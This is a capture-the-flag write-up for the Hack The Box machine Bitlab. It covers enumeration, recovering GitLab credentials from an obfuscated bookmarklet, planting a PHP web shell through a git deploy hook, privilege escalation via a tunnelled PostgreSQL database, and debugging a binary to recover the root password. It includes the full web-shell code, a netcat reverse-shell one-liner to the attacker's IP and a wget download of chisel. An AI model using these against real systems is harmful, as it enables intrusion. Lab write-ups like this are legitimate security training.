# Bitlab [HTB](https://app.hackthebox.com/machines/207)
![bitlab-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/bitlab-01.png)

## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 bitlab.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/ports-02.png)


From here, I send `nmap` to start probing the found ports for more information:

```bash
nmap -p 22,80 -sCV bitlab.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/nmap-res-03.png)


We have the following:

+ An SSH server on port 22.
+ An Nginx server on port 80.


The Nginx server appears to be hosting a [Gitlab](https://en.wikipedia.org/wiki/GitLab) server, which redirects to a login form at `http://bitlab.htb/users/sign_in`. There also seems to be a `robots.txt` file present on the server, with some interesting entires. 


Let's go check it out! 


## Gitlab Port 80.

Requesting the root resource of the website at `http://bitlab.htb/`, does in fact redirect us towards the login form at `http://bitlab.htb/users/sign_in`:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/site-04.png)


Currently we don't have any credentials, so it's best to leave this login form alone for now and keep enumerating the target. 


While looking through the target website, I intercepted the traffic in my Burp proxy and went over the source code, HTTP headers and cookies. Iv'e noticed two interesting things:

1) We get a session cookie from the server which seems to be an md5 digest:

![session-cookie-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/session-cookie-05.png)


2) There is also a CSRF token deeper in the HTML source code:

![csrf-token-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/csrf-token-06.png)


This token is a base64 encoded string, but decoding it leads to cipher text. I thought it was worth mentioning though. 


I also had a look at the `robots.txt` file, most of the entries redirect us back to `http://bitlab.htb/users/sign_in`, so it's not really useful.


At this point I ran a directory and file scan using:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://bitlab.htb/FUZZ -e .txt,.xml,.html,.js,.php --fc 401,302
``` 

![ffuf-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/ffuf-07.png)


The most interesting entry on the list in my opinion is the `root` directory which returns a limited view of the administrator's account:

![admin-account-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/admin-account-08.png)


I tried clicking around this profile to see if I can find anything, but to no avail. All the rest of the entries from the `ffuf` scan have a similar story, we only get a limited view of the pages bacause we don't have a valid session.


While I was going over the entries in the file scan, I also ran a deeper crwaling scan on the site with [feroxbuster](https://github.com/epi052/feroxbuster) as such:

```bash
feroxbuster -u http://bitlab.htb
```

![fero-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/fero-09.png)

![fero-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/fero-10.png)


These two entries caught my attention for some reason. 

+ `http://bitlab.htb/clave` 

This link caught my eye because it looked out of place, yet it also remained me of the `/root` directory we found in the `ffuf` scan. So I thought, perhaps it's another user profile? 


If we open this link we see the following:

![clave-profile-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/clave-profile-11.png)


It is another user profile. So this Gitlab server saves it's user accounts via their username in the root directory of the server. It also seems like they are publicly available, regardless of your session cookie. 


+ `http://bitlab.htb/help/bookmarks.html`

This one caught my attention because it has an `html` extension, so I thought that chances were pretty good that we will get some information out of it. Opening this link returns the following:

![bookmarks-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/bookmarks-12.png)


The last entry really caught my attention. Clicking on this link dosne't open a new tab, but if we copy it instead, we see the following:

```js
javascript:(function(){ var _0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
```

I wasn't sure exactly how this link is working, but I knew that decoding the hex bytes from the text will at least reveal more information. 


To do that, I came up with this simple Python script:

```python
#!/usr/bin/python3 

hex_strings = [b"\x76\x61\x6C\x75\x65", b"\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E", 
               b"\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64", 
               b"\x63\x6C\x61\x76\x65", b"\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64", 
               b"\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"
               ] 

for s in hex_strings:
    print(s.decode('utf-8'))
```

Which resulted in the following:

![clave-creds-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/clave-creds-13.png)


Looks like `clave`'s credentials to login to the Gitlab server! 


I use them and login:

![clave-access-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/clave-access-14.png)


### Clave Access

After logging in to the Gitlab server as `clave`, we will find two repositories of `Profile` & `Deployer`:

![projects-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/projects-15.png)


Let's start with the `Deployer` project since it will enable us to get RCE on the target. The project has a `README.md`, and `index.php` files. The latter is a [git hook](https://www.atlassian.com/git/tutorials/git-hooks) script:

![deployer-15.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/deployer-15.5.png)


In short, git hook scripts are executed everytime a particular event occurs in a Git repository. In this case, the `index.php` script executes a `git pull` operation if a `merge` took place into the `master` branch of the `profile` repository. In other words, if someone merges a commit into the master branch of the `profile` repository, this script executes. 


Why is this important? 


Becuase the `git pull` operation synchronizes whatever changes were made to the remote repositroy **into the local respoitroy**. Or in other words, changes we make to the `profile` repository, will be copied to our target's filesystem. Thus, giving us RCE. 


Fortunately for us, we have write access to the `profile` project, and we can merge commits to the `master` brench manaully. Let's exploit this!


I click on the `Profile` project, and choose to add a new file:

![new-file-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/new-file-16.png)


From there, I name the file `shell.php` and give it the following contents:

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

This should give us a simple web-shell. I then scroll all the way to the button and select `Commit changes`:

![commit-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/commit-17.png)


After the file has been created, I click on the option to create a new merge request:

![option-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/option-18.png)


I leave the default values for the request, scroll down to the buttom and select `Submit Merge request`:

![submit-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/sumbit-19.png)


And finally, I select the option to authorize my merge request, and add my newly added `shell.php` file into the `master` brench of the `profile` project:

![merge-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/merge-20.png)


Once it's done, I can interact with my shell as such:

```bash
curl http://bitlab.htb/profile/shell.php?cmd=id
```

![rce-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/rce-21.png)


From here I use the following payload to get a shell:

```bash
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.89 443 >/tmp/f
```

I start my local listener with:

```bash
rlwrap nc -lnvp 443
```

And finally, I use Burp's encoder to URL encode the payload and supply it to the previous `curl` command, and I get a shell:

![shell-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/shell-22.png)


## Privilege Escalation

After landing on the box, I start looking around the filesystem. There were some interesting things I've noticed, but nothing super useful to help us elevate privileges at this very moment. 


So I recalled that in the `profile` project on the Gitlab server, there was a `README.md` document that mentioned `postgresql`:

![readme-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/readme-23.png)


There is also a `snippet` page that has a connection string to the database:

![conn-string-23.5]()


So finding this server becomes my top priority. To do that, I start by listing the open ports on the target:

```bash
netstat -ntlp
```

![netstat-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/netstat-24.png)


`PostgreSQL` servers usually run on port 5432, and we can see this port is open on the localhsot of the target. There is also port 3000 which seems to be running on a completlely different subnet. Running `ifconfig` shows the following interface:

![ifconfig-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/ifconfig-25.png)


We can see it's a docker interface, which is worth noting but we don't have permissions to interact with the docker instances as the `www-data` service account.  


Instead, I decided to focus on the `PostgreSQL` server. To interact with it, we need to use a client called `psql`, but it's not present on the target:

![which-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/which-26.png)


What we can do instead, is tunnel this port over to our attack machine and access it from there. To do that, we have to use a tool like [chisel](https://github.com/jpillora/chisel) because we dont have SSH access just yet.


I grab a copy of `chisel` to my working directory onmy attack machine, and host it up via a python web server:

```bash
pytho3 -m http.server 80
```

Then, I download it from the target as such:

```bash
cd \dev\shm
wget http://10.10.14.89/chisel; chmod +x chisel
```


Next, I start the `chisel` server on my attack machine with:

```bash
chisel server -p 4545 --reverse
```

Finally, I connect to my server from the target and establish the tunnel:

```bash
./chisel client 10.10.14.89:4545 R:5432:127.0.0.1:5432
```

![client-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/client-27.png)


On my server I recive the connection and the tunnel is established:

![server-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/server-28.png)


From here, I use `psql` to connect to the server using the credentials from the snippet:

```bash
psql -h 127.0.0.1 -p 5432 -U profiles
```

![connect-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/connect-29.png)


Once inside the server, I list the available databases using the `\list` command:

![dbs-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/dbs-30.png)


I decide to switch to the `profiles` database, by running `\c profiles`. Once inside I list the tables using `\d`:

![tables-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/tables-31.png)


We can see one table of `profiles`. I dump everything from this table by running `select * from profiles;`:

![dump-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/dump-32.png)


Decoding the base64 string results in `ssh-str0ng-p@ss`, But using it to login to the SSH as clave fails. Instead, we need to use the actual base64 string as the password:

![clave-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/clave-33.png)


## Clave

If we list `clave`s home directory we can see the presence of a `RemoteConnection.exe` file:

![home-dir-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/home-dir-34.png)


I'll transfer this file to a machine with [Immunity Debugger](https://www.immunityinc.com/products/debugger/) installed so I can analyze it. 


After loading the file into Immunity Debugger, I start by listing all the strings the debugger managed to extract from the binary by: `Rigth click > Search for > All referenced text strings`

![strings-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/strings-35.png)


Which brings the following window:

![putty-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/putty-36.png)


We can guess that this binary probably tries to run `putty.exe`, let's right click on this string, and select `Follow in disassembler`:

![parms-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/parms-37.png)


We can see the program is trying to load some parameters before executing `putty.exe` via `ShellExecuteW`. 


Let's select the highlighted line and set a breakpoint by right clicking on it and selecting `Toggle`. Then let's execute the progarm and see what happens when we reach this breakpoint:

![registers-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/registers-38.png)


We can see some of he parameters loaded into the `putty.exe` program. In this case, it's a SSH connection string for `root`, including he's password. 


I copy this password over to my attack machine and login as root:

![root-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bitlab/img/root-39.png)
